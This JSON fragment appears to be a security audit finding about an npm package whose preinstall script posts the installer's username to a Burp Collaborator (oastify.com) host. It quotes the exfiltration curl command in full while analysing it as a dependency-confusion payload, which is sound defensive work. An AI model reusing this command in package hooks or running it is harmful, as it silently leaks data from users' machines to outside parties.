  "summary": "Preinstall hook exfiltrates installer username to Burp Collaborator endpoint",
  "details": "package.json declares a preinstall lifecycle script that runs `curl -s -d \"$(whoami)\" https://z11f95fv69kjc0s88ex6l1f04raiyamz.oastify.com`. On `npm install`, this automatically executes `whoami` on the installer's machine and POSTs the result to a Burp Collaborator (oastify.com) subdomain controlled by a remote party. The package has no library code or declared functionality — its sole effect on install is shipping the installer's username to an attacker-controlled host. This is a textbook dependency-confusion / supply-chain exfiltration payload.",
